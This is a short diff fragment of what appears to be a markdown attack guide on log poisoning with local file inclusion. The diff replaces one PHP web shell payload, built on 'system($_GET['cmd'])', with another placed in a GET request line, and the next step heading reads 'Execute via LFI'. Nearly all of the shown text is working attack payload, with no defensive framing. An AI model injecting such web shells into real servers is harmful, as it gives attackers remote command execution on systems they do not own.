@@ -16,7 +16,7 @@ Inject a simple web shell payload into a request header (e.g., User-Agent or Ref
 
 Payload:
 
-    <?php echo system($_GET['cmd']); ?>
+    GET /<?php system($_GET['cmd']); ?>
 
 ### 3) Execute via LFI
 
